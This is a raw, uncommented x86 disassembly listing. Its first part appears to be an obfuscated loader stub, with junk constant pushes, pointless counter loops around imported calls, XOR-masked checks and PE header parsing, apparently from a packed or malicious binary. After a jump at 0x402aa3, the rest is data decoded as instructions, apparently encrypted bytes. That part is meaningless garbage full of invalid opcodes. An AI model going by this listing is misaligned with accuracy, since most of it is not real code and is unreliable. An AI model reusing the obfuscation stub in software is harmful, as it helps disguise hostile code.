  4028aa:	push   DWORD PTR [ebp-0x24]
  4028ad:	push   0x43f7
  4028b2:	push   0x38dd
  4028b7:	push   DWORD PTR [ebp-0x10]
  4028ba:	push   0x3246
  4028bf:	push   0x510b
  4028c4:	push   0x8cd7
  4028c9:	push   DWORD PTR [ebp-0xc]
  4028cc:	push   0x63f7
  4028d1:	push   DWORD PTR [ebp-0x10]
  4028d4:	call   DWORD PTR ds:0x42e8bb
  4028da:	cmp    DWORD PTR ds:0x42d000,0x6
  4028e1:	jne    0x4028f4
  4028e7:	mov    ecx,DWORD PTR ds:0x42d000
  4028ed:	dec    ecx
  4028ee:	mov    DWORD PTR ds:0x42d000,ecx
  4028f4:	mov    ecx,DWORD PTR ds:0x42d000
  4028fa:	dec    ecx
  4028fb:	mov    DWORD PTR ds:0x42d000,ecx
  402901:	jmp    0x402880
  402906:	mov    ecx,0x751089b
  40290b:	xor    eax,ecx
  40290d:	cmp    eax,0xf89c85f0
  402912:	jne    0x402941
  402918:	mov    eax,DWORD PTR [ebp+0x8]
  40291b:	push   esi
  40291c:	mov    esi,DWORD PTR [ebp+0x8]
  40291f:	add    esi,DWORD PTR [eax+0x3c]
  402922:	mov    DWORD PTR [ebp+0x8],esi
  402925:	mov    eax,DWORD PTR [ebp-0x4]
  402928:	mov    esi,DWORD PTR [ebp+0x8]
  40292b:	xor    eax,ecx
  40292d:	add    eax,edx
  40292f:	cmp    DWORD PTR [esi+0x54],eax
  402932:	pop    esi
  402933:	je     0x402941
  402939:	mov    eax,DWORD PTR [ebp+0x8]
  40293c:	jmp    0x402948
  402941:	mov    eax,DWORD PTR [ebp-0x4]
  402944:	xor    eax,ecx
  402946:	add    eax,edx
  402948:	leave  
  402949:	ret    0x4
  40294c:	push   ebp
  40294d:	mov    ebp,esp
  40294f:	sub    esp,0x38
  402952:	xor    eax,eax
  402954:	xor    eax,DWORD PTR ds:0x42c00c
  40295a:	xor    DWORD PTR ds:0x42d010,eax
  402960:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  402967:	and    DWORD PTR ds:0x429020,0x0
  402971:	jmp    0x402981
  402976:	mov    eax,ds:0x429020
  40297b:	inc    eax
  40297c:	mov    ds:0x429020,eax
  402981:	cmp    DWORD PTR ds:0x429020,0x12
  402988:	jae    0x4029d7
  40298e:	cmp    DWORD PTR ds:0x429020,0x4
  402995:	jne    0x4029b5
  40299b:	push   0x3575
  4029a0:	push   0x2056
  4029a5:	push   0x7cad
  4029aa:	push   0x3741
  4029af:	call   DWORD PTR ds:0x42e8e7
  4029b5:	cmp    DWORD PTR ds:0x429020,0x3
  4029bc:	jne    0x4029d0
  4029c2:	xor    eax,eax
  4029c4:	add    eax,DWORD PTR ds:0x429020
  4029ca:	inc    eax
  4029cb:	mov    ds:0x429020,eax
  4029d0:	jmp    0x402976
  4029d5:	not    eax
  4029d7:	push   ebx
  4029d8:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  4029df:	mov    eax,DWORD PTR [ebp-0x4]
  4029e2:	add    DWORD PTR ds:0x42900c,0x42a018
  4029ec:	push   esi
  4029ed:	mov    esi,0x751089b
  4029f2:	xor    DWORD PTR ds:0x429018,0x429014
  4029fc:	xor    eax,esi
  4029fe:	sbb    DWORD PTR ds:0x42b000,0x77b
  402a08:	push   edi
  402a09:	mov    DWORD PTR ds:0x429018,0x1e
  402a13:	cmp    DWORD PTR ds:0x429018,0x0
  402a1a:	je     0x402a6e
  402a20:	cmp    DWORD PTR ds:0x429018,0xe
  402a27:	jne    0x402a42
  402a2d:	push   0x6dbc
  402a32:	push   0x42a004
  402a37:	push   0x657a
  402a3c:	call   DWORD PTR ds:0x42e8bf
  402a42:	cmp    DWORD PTR ds:0x429018,0xf
  402a49:	jne    0x402a5c
  402a4f:	mov    edi,DWORD PTR ds:0x429018
  402a55:	dec    edi
  402a56:	mov    DWORD PTR ds:0x429018,edi
  402a5c:	mov    edi,DWORD PTR ds:0x429018
  402a62:	dec    edi
  402a63:	mov    DWORD PTR ds:0x429018,edi
  402a69:	jmp    0x402a13
  402a6e:	mov    edi,0x3272e2
  402a73:	or     DWORD PTR ds:0x42a014,0x429014
  402a7d:	add    eax,edi
  402a7f:	adc    DWORD PTR ds:0x429008,0x42a018
  402a89:	mov    DWORD PTR [ebp-0x1c],eax
  402a8c:	movzx  eax,BYTE PTR ds:0x429010
  402a93:	xor    eax,DWORD PTR ds:0x42b00c
  402a99:	mov    ds:0x429010,eax
  402a9e:	mov    eax,DWORD PTR [ebp+0x14]
  402aa1:	test   eax,eax
  402aa3:	jmp    0x404df8
  402aa8:	retf   
  402aa9:	int    0x38
  402aab:	outs   dx,DWORD PTR ds:[esi]
  402aac:	cmp    cl,BYTE PTR [ebx-0x3abb3675]
  402ab2:	jae    0x402a43
  402ab4:	and    eax,0x7cc0e53b
  402ab9:	jl     0x402b37
  402abb:	jl     0x402af1
  402abd:	pop    edi
  402abe:	jl     0x402b3c
  402ac0:	adc    eax,0x1139172e
  402ac5:	and    eax,0x32652f13
  402aca:	popa   
  402acb:	pusha  
  402acc:	gs jnp 0x402b3b
  402acf:	ins    BYTE PTR es:[edi],dx
  402ad0:	ins    DWORD PTR es:[edi],dx
  402ad1:	xor    al,0xc5
  402ad3:	fdivp  st(1),st
  402ad5:	push   0x42
  402ad7:	arpl   WORD PTR [ecx+0x53],di
  402ada:	stos   BYTE PTR es:[edi],al
  402adb:	jp     0x402b4a
  402add:	push   ecx
  402ade:	iret   
  402adf:	pop    ebp
  402ae0:	dec    esp
  402ae1:	cmp    cl,BYTE PTR [esi+0x577087fc]
  402ae7:	dec    ebp
  402ae8:	jg     0x402b21
  402aea:	mov    ah,BYTE PTR [eax+0x33a4ba7f]
  402af0:	jmp    DWORD PTR cs:[eax-0x22]
  402af4:	cld    
  402af5:	imul   edi,DWORD PTR [edi+0x18],0xffffffed
  402af9:	xor    ebp,ecx
  402afb:	mov    esp,0xd82b87ed
  402b00:	and    DWORD PTR [ecx],0xf
  402b03:	push   ecx
  402b04:	mov    ds:0x6df7c68c,eax
  402b09:	fld    QWORD PTR [esi]
  402b0b:	(bad)  
  402b0c:	or     ah,bh
  402b0e:	and    BYTE PTR [edx],dl
  402b10:	inc    edx
  402b11:	push   cs
  402b12:	and    BYTE PTR [ebx+0x62],ah
  402b15:	mov    cl,0xaf
  402b17:	sub    ebx,DWORD PTR [ecx+0x5]
  402b1a:	mov    al,ds:0x2341e1ff
  402b1f:	jbe    0x402b55
  402b21:	ret    0xf153
  402b24:	sbb    al,0xfc
  402b26:	jb     0x402ae1
  402b28:	jnp    0x402b07
  402b2a:	xchg   edx,eax
  402b2b:	pop    edi
  402b2c:	cmp    DWORD PTR [ecx+0x49841607],0xb
  402b33:	cwde   
  402b34:	ds je  0x402ac2
  402b37:	add    ebx,esp
  402b39:	sub    eax,0x4b368d54
  402b3e:	push   esi
  402b3f:	sti    
  402b40:	iret   
  402b41:	mov    WORD PTR [ecx],fs
  402b43:	or     edx,0x6982ceb7
  402b49:	out    0x45,al
  402b4b:	push   esp
  402b4c:	dec    esi
  402b4d:	push   cs
  402b4e:	cmp    BYTE PTR [ebx],cl
  402b50:	xor    BYTE PTR [ebx],bl
  402b52:	lods   eax,DWORD PTR ds:[esi]
  402b53:	inc    ebx
  402b54:	int3   
  402b55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b56:	dec    edx
  402b57:	fiadd  DWORD PTR [esi]
  402b59:	push   eax
  402b5a:	std    
  402b5b:	push   esp
  402b5c:	push   eax
  402b5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b5e:	icebp  
  402b5f:	bound  edi,QWORD PTR [edi+0x2e1e44f2]
  402b65:	cmp    ebp,DWORD PTR [ebp+0x50d44caa]
  402b6b:	call   0xd547:0xef23d656
  402b72:	inc    edx
  402b73:	cmp    ecx,ebx
  402b75:	int3   
  402b76:	xchg   DWORD PTR [ebx+0x79],ecx
  402b79:	sbb    al,0xfa
  402b7b:	shl    BYTE PTR [eax],0x10
  402b7e:	cmp    al,0xf6
  402b80:	and    al,0x1c
  402b82:	ss nop
  402b84:	and    edi,DWORD PTR [ecx+0x5e]
  402b87:	cmp    ch,BYTE PTR [esi]
  402b89:	retf   0x89af
  402b8c:	push   0x20
  402b8e:	mov    bh,0xcc
  402b90:	int3   
  402b91:	push   ebx
  402b92:	iret   
  402b93:	in     eax,0x75
  402b95:	(bad)  
  402b96:	and    al,0xe1
  402b98:	pop    es
  402b99:	mov    ds:0x1c009beb,eax
  402b9e:	push   ecx
  402b9f:	fcmovnb st,st(6)
  402ba1:	mov    eax,ds:0x6ca098b4
  402ba6:	mov    ds:0x56a1cb30,al
  402bab:	outs   dx,DWORD PTR ds:[esi]
  402bac:	xor    BYTE PTR [eax-0x45],dh
  402baf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402bb0:	clc    
  402bb1:	push   ss
  402bb2:	mov    ecx,0xe19ab488
  402bb7:	call   0x7c7e:0x4dced3c1
  402bbe:	sbb    ecx,DWORD PTR [edi-0x21c3b6bc]
  402bc4:	add    ch,bl
  402bc6:	mov    ds:0x776b1ca4,eax
  402bcb:	xchg   edi,eax
  402bcc:	pusha  
  402bcd:	popa   
  402bce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402bcf:	jns    0x402beb
  402bd1:	je     0x402c1e
  402bd3:	add    esp,ebx
  402bd5:	inc    edi
  402bd6:	lea    ebx,[ecx+esi*8-0x78928f4d]
  402bdd:	push   0xffffff9c
  402bdf:	aas    
  402be0:	add    DWORD PTR [edx+0x1],ecx
  402be3:	fs sbb eax,0x660b39b8
  402be9:	fabs   
  402beb:	cmc    
  402bec:	(bad)  
  402bee:	repz xor BYTE PTR [ebp-0x78],0x99
  402bf3:	shl    DWORD PTR [edi+0x757e348e],1
  402bf9:	add    BYTE PTR [ebp+0x1875c444],ch
  402bff:	push   ss
  402c00:	cmp    al,0xa1
  402c02:	ficomp DWORD PTR [eax]
  402c04:	jge    0x402b98
  402c06:	xchg   DWORD PTR [ebx+0x1e],esp
  402c09:	inc    ebx
  402c0a:	mov    eax,0xa87ca70
  402c10:	and    al,0x2
  402c12:	mov    ebp,es
  402c14:	jne    0x402c7f
  402c16:	mov    bl,0x9f
  402c18:	sub    BYTE PTR [ecx+0x6f73075a],al
  402c1e:	mov    eax,DWORD PTR [esi+0x3ec56e58]
  402c24:	es loopne 0x402baf
  402c27:	loop   0x402c1f
  402c29:	pop    ecx
  402c2a:	out    dx,al
  402c2b:	mov    ds:0xbeb11ede,eax
  402c30:	data16 int 0xd0
  402c33:	sub    al,BYTE PTR [eax+0x13]
  402c36:	es aad 0x4
  402c39:	sub    DWORD PTR [eax+0x4013a888],ecx
  402c3f:	cmp    DWORD PTR ds:0x506d2877,ebp
  402c45:	cmc    
  402c46:	jge    0x402c09
  402c48:	xchg   ebp,eax
  402c49:	and    BYTE PTR [eax],cl
  402c4b:	sub    BYTE PTR [edi-0x29],dh
  402c4e:	mov    fs,ecx
  402c50:	xor    DWORD PTR [esi+0x5],ebx
  402c53:	out    0x9,eax
  402c55:	int    0x1
  402c57:	cwde   
  402c58:	mov    esi,0xf4757e9b
  402c5d:	rcl    bl,0xbc
  402c60:	mov    al,0x55
  402c62:	(bad)  
  402c63:	mov    ebx,0xad71cca
  402c68:	jl     0x402c96
  402c6a:	push   cs
  402c6b:	sahf   
  402c6c:	loope  0x402c85
  402c6e:	mov    eax,ds:0x1d798a78
  402c73:	sbb    eax,0x3cf2ecc7
  402c78:	data16 and bh,BYTE PTR [esi]
  402c7b:	dec    ebx
  402c7c:	sar    DWORD PTR [esi-0x55338ba3],0x29
  402c83:	add    ebx,DWORD PTR [edx-0x75c5942d]
  402c89:	repz push ss
  402c8b:	push   edx
  402c8c:	(bad)  [ebp-0x52]
  402c8f:	mov    al,ds:0xfb471fc2
  402c94:	mov    ch,0x22
  402c96:	test   al,0x60
  402c98:	psubb  mm4,QWORD PTR [esi]
  402c9b:	xlat   BYTE PTR ds:[ebx]
  402c9c:	cs iret 
  402c9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c9f:	sub    al,0xe5
  402ca1:	and    esp,DWORD PTR [ecx+0x69]
  402ca4:	pop    esp
  402ca5:	cwde   
  402ca6:	xchg   ebp,eax
  402ca7:	and    esp,edx
  402ca9:	inc    edi
  402caa:	fidiv  DWORD PTR [edi-0x1d]
  402cad:	pop    ss
  402cae:	imul   esi,ecx,0x6f
  402cb1:	pop    esp
  402cb2:	pop    esi
  402cb3:	or     eax,0xf0d53737
  402cb8:	int    0xc8
  402cba:	(bad)  
  402cbc:	mov    dh,BYTE PTR [edx+0x2adc96bf]
  402cc2:	jno    0x402cc6
  402cc4:	ror    DWORD PTR [edi+ebx*1+0x3a341d2d],1
  402ccb:	jb     0x402c6c
  402ccd:	or     DWORD PTR [edi],ecx
  402ccf:	pop    ds
  402cd0:	sar    dl,cl
  402cd2:	into   
  402cd3:	mov    al,ds:0x345f0b88
  402cd8:	dec    ecx
  402cd9:	jae    0x402c68
  402cdb:	lea    ecx,[eax-0x4b]
  402cde:	aam    0x5b
  402ce0:	mov    edx,0x51fc460b
  402ce5:	xor    eax,0x4e7d3661
  402cea:	mov    dh,0xa5
  402cec:	jmp    0xd53d:0x60457c9f
  402cf3:	ffree  st(6)
  402cf5:	and    dl,BYTE PTR [esi-0x4bcc2bc4]
  402cfb:	shl    DWORD PTR [ebp+0x6c9b4c50],1
  402d01:	aas    
  402d02:	(bad)  
  402d03:	fwait
  402d04:	jle    0x402c97
  402d06:	sbb    eax,0x2d7b3b01
  402d0b:	test   BYTE PTR [ebp-0x61],bl
  402d0e:	outs   dx,DWORD PTR ds:[esi]
  402d0f:	leave  
  402d10:	jmp    0x1d63d528
  402d15:	fsub   DWORD PTR [ecx+ebp*1-0x51]
  402d19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d1a:	inc    ecx
  402d1b:	cld    
  402d1c:	mov    eax,0xef9b77ed
  402d21:	arpl   WORD PTR [esi+0x3c767508],bx
  402d27:	retf   
  402d28:	push   ss
  402d29:	fsubrp st(3),st
  402d2b:	jmp    DWORD PTR [esi]
  402d2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402d2e:	mov    cl,0x84
  402d30:	jno    0x402d22
  402d32:	sub    ebx,DWORD PTR [edi]
  402d34:	fnstcw WORD PTR [ebx+0x1a]
  402d37:	inc    edx
  402d38:	xlat   BYTE PTR ds:[ebx]
  402d39:	pop    esi
  402d3a:	lea    edx,[edx]
  402d3c:	jns    0x402d06
  402d3e:	dec    ebx
  402d3f:	in     eax,dx
  402d40:	jg     0x402d6a
  402d42:	in     eax,0x1
  402d44:	xchg   ah,bh
  402d46:	inc    edx
  402d47:	pop    ebx
  402d48:	push   eax
  402d49:	jb     0x402d66
  402d4b:	jle    0x402d82
  402d4d:	jmp    DWORD PTR [ecx+0x1f]
  402d50:	mov    WORD PTR [ebp+0x1c],fs
  402d53:	xchg   DWORD PTR [ecx],esp
  402d55:	shl    DWORD PTR [ebp-0x1f9cd64b],1
  402d5b:	mov    edx,0x8d6c73d1
  402d60:	cmp    BYTE PTR [edx-0x21],0xef
  402d64:	jecxz  0x402dce
  402d66:	cs test eax,0xae1046a5
  402d6c:	pop    esp
  402d6d:	ss inc ebx
  402d6f:	dec    esp
  402d70:	aam    0xbf
  402d72:	ins    DWORD PTR es:[edi],dx
  402d73:	xchg   edi,eax
  402d74:	adc    DWORD PTR [edi+0x67ff0ce4],esi
  402d7a:	push   ebx
  402d7b:	cmp    al,0xaf
  402d7d:	xchg   esp,eax
  402d7e:	mov    ebp,0x186133fe
  402d83:	jnp    0x402ded
  402d85:	ret    0xa168
  402d88:	push   esp
  402d89:	sub    BYTE PTR [edi],ah
  402d8b:	xchg   ebx,eax
  402d8c:	adc    esi,ebp
  402d8e:	das    
  402d8f:	mov    edx,0x2fa9d705
  402d94:	and    bh,BYTE PTR [eax]
  402d96:	sub    DWORD PTR [ebx-0x68],eax
  402d99:	or     BYTE PTR ds:0xc75695e1,dl
  402d9f:	pop    esp
  402da0:	aas    
  402da1:	push   ebp
  402da2:	sbb    eax,esp
  402da4:	xchg   ebx,eax
  402da5:	sbb    BYTE PTR [esi-0x79f0a6a5],bh
  402dab:	mov    edx,0x457ed6d2
  402db0:	adc    cl,cl
  402db2:	ja     0x402d6c
  402db4:	push   ds
  402db5:	xchg   BYTE PTR [ebp+0x59],dh
  402db8:	xor    DWORD PTR [edi-0xe],eax
  402dbb:	and    edi,DWORD PTR gs:[esi+esi*4+0x3144b44a]
  402dc3:	arpl   WORD PTR [edi],dx
  402dc5:	push   edi
  402dc6:	push   ebx
  402dc7:	outs   dx,DWORD PTR ds:[esi]
  402dc8:	in     eax,0x65
  402dca:	mov    fs:0x2c842fcc,eax
  402dd0:	jae    0x402d68
  402dd2:	call   0x5148d599
  402dd7:	clc    
  402dd8:	jb     0x402e54
  402dda:	ins    BYTE PTR es:[edi],dx
  402ddb:	xchg   ecx,eax
  402ddc:	adc    al,0x67
  402dde:	je     0x402d9e
  402de0:	push   eax
  402de1:	stos   BYTE PTR es:[edi],al
  402de2:	outs   dx,BYTE PTR ds:[esi]
  402de3:	pop    ebx
  402de4:	inc    ebp
  402de5:	pop    esi
  402de6:	out    dx,eax
  402de7:	and    DWORD PTR [ebx+0x59],esi
  402dea:	mov    edi,0xf4e86bb5
  402def:	ja     0x402e36
  402df1:	jbe    0x402e5d
  402df3:	dec    edi
  402df4:	xor    bl,BYTE PTR [ebx-0x5a]
  402df7:	pop    edx
  402df8:	mov    ebx,0x3409b2cf
  402dfd:	loope  0x402d9a
  402dff:	lea    ebp,[ebx+0x62]
  402e02:	push   esp
  402e03:	(bad)  
  402e04:	fcmovb st,st(6)
  402e06:	mov    dl,BYTE PTR ds:0x5e679dd0
  402e0c:	or     DWORD PTR [eax-0x68ede67a],edx
  402e12:	sub    al,BYTE PTR [edx-0x35abe51a]
  402e18:	rcr    BYTE PTR [edx-0x67],0xc4
  402e1c:	xor    DWORD PTR [ebx],eax
  402e1e:	pop    ebx
  402e1f:	mov    esi,0xfe0c5cba
  402e24:	sub    al,0x90
  402e26:	pop    ds
  402e27:	add    DWORD PTR [ebp+0x63],0x18dd8b54
  402e2e:	sub    eax,0x8fa4d9fc
  402e33:	pop    esp
  402e34:	loope  0x402e64
  402e36:	loopne 0x402e81
  402e38:	or     eax,0xecc19b0
  402e3d:	dec    eax
  402e3e:	mov    eax,0x796cddf
  402e43:	mov    WORD PTR [edi],fs
  402e45:	out    dx,al
  402e46:	shl    BYTE PTR [ebx-0x80],1
  402e49:	sbb    DWORD PTR [edi+0x909af15],edi
  402e4f:	test   BYTE PTR [ebx+0x465aed81],al
  402e55:	or     al,0xa7
  402e57:	test   al,0xd1
  402e59:	test   BYTE PTR [ebx+0x60],0xeb
  402e5d:	iret   
  402e5e:	cmc    
  402e5f:	mov    al,0x32
  402e61:	mov    esi,0x103ad6e3
  402e66:	mov    eax,ds:0x2bb6654a
  402e6b:	dec    eax
  402e6c:	fcom   QWORD PTR [esi]
  402e6e:	push   eax
  402e6f:	pop    es
  402e70:	push   cs
  402e71:	or     cl,BYTE PTR [edi+0x2d]
  402e74:	ret    0x64d2
  402e77:	sahf   
  402e78:	mov    cl,0xff
  402e7a:	or     cl,bh
  402e7c:	jge    0xa78c4205
  402e82:	add    al,0xd8
  402e84:	sub    ebp,esp
  402e86:	mov    cl,0xbe
  402e88:	mov    ebp,0x13657196
  402e8d:	ret    
  402e8e:	dec    ebx
  402e8f:	mov    eax,ds:0x33b28063
  402e94:	cmp    edi,DWORD PTR [ebp+0x704d7fee]
  402e9a:	addr16 js 0x402e28
  402e9d:	adc    edi,DWORD PTR [edx+0x4e4c854a]
  402ea3:	(bad)  
  402ea4:	mov    edx,0xd32db625
  402ea9:	rol    BYTE PTR [eax+0x60],0xdb
  402ead:	xor    DWORD PTR [ebx],0xfffffff0
  402eb0:	xor    al,0x6e
  402eb2:	js     0x402e51
  402eb4:	adc    esi,edx
  402eb6:	rcr    BYTE PTR [edx+ebp*8],0x5
  402eba:	retf   0x7edd
  402ebd:	pop    DWORD PTR [ebp-0x3f11b18d]
  402ec3:	or     DWORD PTR [ecx*8+0x25a7a96c],ebp
  402eca:	xlat   BYTE PTR ds:[ebx]
  402ecb:	mov    bl,0xab
  402ecd:	pop    ecx
  402ece:	sbb    eax,0x821b7278
  402ed3:	pop    esi
  402ed4:	mov    es,esi
  402ed6:	pop    ebp
  402ed7:	retf   
  402ed8:	fst    DWORD PTR [edi+0x4d]
  402edb:	jmp    0x402ed3
  402edd:	stos   DWORD PTR es:[edi],eax
  402ede:	jl     0x402e91
  402ee0:	fcomp  DWORD PTR [ecx+0x404f7005]
  402ee6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ee7:	imul   esi,ebp,0x7a402162
  402eed:	or     al,0x9b
  402eef:	pop    ebp
  402ef0:	rol    BYTE PTR [ecx],cl
  402ef2:	ret    0xf1b5
  402ef5:	dec    ebx
  402ef6:	add    BYTE PTR [eax+ebx*1-0x17],0x1d
  402efb:	dec    eax
  402efc:	(bad)
  402eff:	lods   al,BYTE PTR ds:[esi]
  402f00:	(bad)  
  402f01:	and    al,0xb8
  402f03:	imul   edx,DWORD PTR [edi+0x53a312aa],0xffffffb6
  402f0a:	or     edx,DWORD PTR ds:[ecx+0x5b]
  402f0e:	pop    ebx
  402f0f:	mov    edx,0x2ac5151b
  402f14:	jae    0x402ef6
  402f16:	add    dh,BYTE PTR [eax]
  402f18:	push   es
  402f19:	fs in  eax,dx
  402f1b:	int3   
  402f1c:	mov    dh,0x66
  402f1e:	cmp    ebx,edi
  402f20:	aad    0xb2
  402f22:	stos   DWORD PTR es:[edi],eax
  402f23:	fsubr  st,st(1)
  402f25:	and    ecx,DWORD PTR [eax-0x243b357d]
  402f2b:	loope  0x402f85
  402f2d:	aas    
  402f2e:	mov    gs,ebp
  402f30:	xor    eax,0x37a33592
  402f35:	jno    0x402ef0
  402f37:	ret    
  402f38:	sbb    eax,0xac76493e
  402f3d:	cmp    eax,0xc9355531
  402f42:	leave  
  402f43:	inc    edx
  402f44:	mov    ecx,0x939945e2
  402f49:	and    BYTE PTR [ebx-0x368e4d93],cl
  402f4f:	xchg   bh,ch
  402f51:	mov    esp,0xdee102a1
  402f56:	dec    esp
  402f57:	out    0x43,eax
  402f59:	mov    WORD PTR [eax+0x6e],ds
  402f5c:	or     DWORD PTR [ecx+0x54],esi
  402f5f:	ror    BYTE PTR gs:[si],cl
  402f63:	sub    DWORD PTR [edi],eax
  402f65:	and    ebx,DWORD PTR [ebp+0x58]
  402f68:	xchg   BYTE PTR [ebp+0x6e89aaa1],ah
  402f6e:	imul   eax,DWORD PTR [esi],0x32a485d1
  402f74:	jle    0x402fae
  402f76:	and    BYTE PTR ds:0x1a1ebecc,dh
  402f7c:	stos   BYTE PTR es:[edi],al
  402f7d:	push   ebp
  402f7e:	add    eax,0xf5265c6e
  402f83:	push   ecx
  402f84:	icebp  
  402f85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f86:	xchg   esp,eax
  402f87:	add    esi,0x70
  402f8a:	xor    BYTE PTR [edi-0xe9224f1],0xa4
  402f91:	mov    ch,dl
  402f93:	jo     0x402fc4
  402f95:	clc    
  402f96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f97:	push   ecx
  402f98:	inc    esp
  402f99:	xchg   ecx,eax
  402f9a:	push   ds
  402f9b:	(bad)  
  402f9c:	shl    BYTE PTR [ecx],1
  402f9e:	ins    BYTE PTR es:[edi],dx
  402f9f:	lea    esp,[eax]
  402fa1:	jns    0x402fea
  402fa3:	xor    ecx,DWORD PTR [esi]
  402fa5:	cmp    al,0x6b
  402fa7:	int3   
  402fa8:	xlat   BYTE PTR ds:[ebx]
  402fa9:	shl    al,1
  402fab:	push   cs
  402fac:	ins    BYTE PTR es:[edi],dx
  402fad:	imul   DWORD PTR [ebp+eax*4-0x3c]
  402fb1:	push   edi
  402fb2:	(bad)  
  402fb4:	sahf   
  402fb5:	and    cl,BYTE PTR [esi-0x18]
  402fb8:	pop    es
  402fb9:	adc    DWORD PTR [edx+0x72],edi
  402fbc:	sbb    BYTE PTR [eax],bl
  402fbe:	ror    ah,1
  402fc0:	ds into 
  402fc2:	mov    ?,WORD PTR [ecx+0x648f69b1]
  402fc8:	jbe    0x402f8c
  402fca:	adc    ah,cl
  402fcc:	inc    ebp
  402fcd:	sub    DWORD PTR [eax-0x2e],esi
  402fd0:	or     eax,0xed8abb56
  402fd5:	or     al,0xcd
  402fd7:	in     eax,0x20
  402fd9:	mov    al,0xec
  402fdb:	call   0x48a6:0x6f3196ba
  402fe2:	aas    
  402fe3:	dec    esp
  402fe4:	xor    eax,0x90be6e49
  402fe9:	jl     0x403014
  402feb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402fec:	xchg   BYTE PTR [esi+0x1248e02c],dl
  402ff2:	push   0x319a7e6c
  402ff7:	rol    BYTE PTR [edi-0x35],1
  402ffa:	les    ebx,FWORD PTR [edx+0x75]
  402ffd:	or     edi,edi
  402fff:	xchg   edx,eax
  403000:	or     bh,dh
  403002:	push   edx
  403003:	lods   eax,DWORD PTR ds:[esi]
  403004:	fwait
  403005:	mov    edx,0xf8961f50
  40300a:	mov    bh,0x74
  40300c:	pop    esi
  40300d:	cmp    cl,BYTE PTR [ebx+0x32]
  403010:	icebp  
  403011:	je     0x403051
  403013:	rcr    DWORD PTR [ebx+0x40],0x23
  403017:	in     eax,dx
  403018:	mov    DWORD PTR [eax],edx
  40301a:	add    ebp,ebx
  40301c:	(bad)  [ebp-0x4dfd7631]
  403022:	fdivp  st(3),st
  403024:	lods   al,BYTE PTR ds:[esi]
  403025:	sar    BYTE PTR [edi],1
  403027:	xlat   BYTE PTR ds:[ebx]
  403028:	lahf   
  403029:	cmp    bl,BYTE PTR [edx-0x40ebe280]
  40302f:	bound  ecx,QWORD PTR [esi]
  403031:	sbb    cl,0xec
  403034:	pushf  
  403035:	dec    ecx
  403036:	or     cl,ah
  403038:	and    bh,0x49
  40303b:	test   al,0x46
  40303d:	ret    
  40303e:	ret    
  40303f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403040:	and    DWORD PTR [esp],ecx
  403043:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403044:	xlat   BYTE PTR ds:[ebx]
  403045:	mov    ah,0xc1
  403047:	push   edi
  403048:	jno    0x402fd6
  40304a:	xor    ah,BYTE PTR [ecx+0x37056262]
  403050:	push   es
  403051:	lds    edx,FWORD PTR [esi]
  403053:	push   es
  403054:	bound  ebx,QWORD PTR [esi-0x6cc00081]
  40305a:	cmp    eax,0x37db46ca
  40305f:	outs   dx,DWORD PTR ds:[esi]
  403060:	xlat   BYTE PTR ds:[ebx]
  403061:	ss mov al,0x96
  403064:	mov    DWORD PTR [edx-0xb2b454f],ecx
  40306a:	xlat   BYTE PTR ds:[ebx]
  40306b:	adc    ah,cl
  40306d:	es gs ds fwait
  403071:	or     esp,DWORD PTR [edx+0x63]
  403074:	mov    esp,DWORD PTR cs:[ebx-0x66]
  403078:	in     al,dx
  403079:	inc    eax
  40307a:	out    0xdb,al
  40307c:	cdq    
  40307d:	stc    
  40307e:	sbb    esi,edi
  403080:	lds    ebp,FWORD PTR [eax+0x9ffbe4d]
  403086:	inc    eax
  403087:	(bad)  
  403088:	xchg   ecx,eax
  403089:	mov    bh,BYTE PTR [ecx+0x460bd26d]
  40308f:	aas    
  403090:	int3   
  403091:	xor    eax,0x330b3878
  403096:	cvtps2pi mm0,QWORD PTR [eax-0x50]
  40309a:	inc    ebx
  40309b:	ja     0x4030d6
  40309d:	(bad)  
  40309f:	iret   
  4030a0:	nop
  4030a1:	push   esp
  4030a2:	fwait
  4030a3:	cmp    DWORD PTR [ecx+0x45],ecx
  4030a6:	adc    BYTE PTR [ebp+0x5be511ed],dh
  4030ac:	stos   BYTE PTR es:[edi],al
  4030ad:	data16 sbb BYTE PTR [ebx+0x2e6d8fec],bl
  4030b4:	cmp    eax,DWORD PTR [edx+0x31]
  4030b7:	pop    esi
  4030b8:	xchg   ecx,eax
  4030b9:	mov    edi,0x3e5005ff
  4030be:	out    dx,eax
  4030bf:	cmp    ecx,0x4928ae7f
  4030c5:	mov    ah,0x47
  4030c7:	inc    ecx
  4030c8:	mov    bl,BYTE PTR [ecx-0x2e30858b]
  4030ce:	mov    ebp,0xa62a0feb
  4030d3:	cwde   
  4030d4:	ror    BYTE PTR [edi-0x2d],0x5e
  4030d8:	es test al,0x69
  4030db:	pop    edi
  4030dc:	inc    ecx
  4030dd:	popf   
  4030de:	lea    ebx,[ebx]
  4030e0:	dec    edi
  4030e1:	push   0x21e6ce7f
  4030e6:	pop    ebx
  4030e7:	jbe    0x40308a
  4030e9:	retf   
  4030ea:	shr    DWORD PTR [edi-0x42],cl
  4030ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4030ee:	ins    DWORD PTR es:[edi],dx
  4030ef:	shl    BYTE PTR [esi-0x67758f71],0x6e
  4030f6:	je     0x403163
  4030f8:	xchg   ebp,eax
  4030f9:	sahf   
  4030fa:	repnz xchg esi,eax
  4030fc:	jno    0x403089
  4030fe:	mov    ds:0xe47cdedc,eax
  403103:	jae    0x403159
  403105:	dec    esi
  403106:	inc    edx
  403107:	or     ah,BYTE PTR [ebx-0x2d]
  40310a:	(bad)  
  40310b:	in     eax,dx
  40310c:	or     ah,BYTE PTR [eax-0x2c]
  40310f:	add    BYTE PTR [edi],dl
